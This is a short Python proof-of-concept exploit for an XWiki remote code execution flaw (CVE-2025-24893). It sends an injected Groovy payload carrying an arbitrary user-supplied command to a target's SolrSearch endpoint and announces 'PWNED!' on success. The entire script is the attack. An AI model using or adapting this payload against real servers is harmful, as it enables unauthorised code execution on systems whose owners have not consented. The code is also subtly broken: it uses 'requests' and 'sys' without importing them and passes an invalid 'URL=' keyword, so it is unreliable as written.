import argparse

parser = argparse.ArgumentParser(description="XWiki SolrSearchMacros Remote Code Execution (CVE-2025-24893) PoC. Reference: https://nvd.nist.gov/vuln/detail/CVE-2025-24893")
parser.add_argument("URL", type=str, help="target address")
parser.add_argument("COMMAND", type=str, help="command to execute e.g. Runtime.getRuntime().exec('calc')")
parser.add_argument("-v", "--version", action="version", version="1.0")
args = parser.parse_args()

res = requests.get(URL = args.URL + "/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}" + args.COMMAND + ";println('PWNED!'){{/groovy}}{{/async}}")

sys.exit("[+] PWNED! Command executed...") if "PWNED!" in res.text else sys.exit("[-] Failed to execute command, exiting...")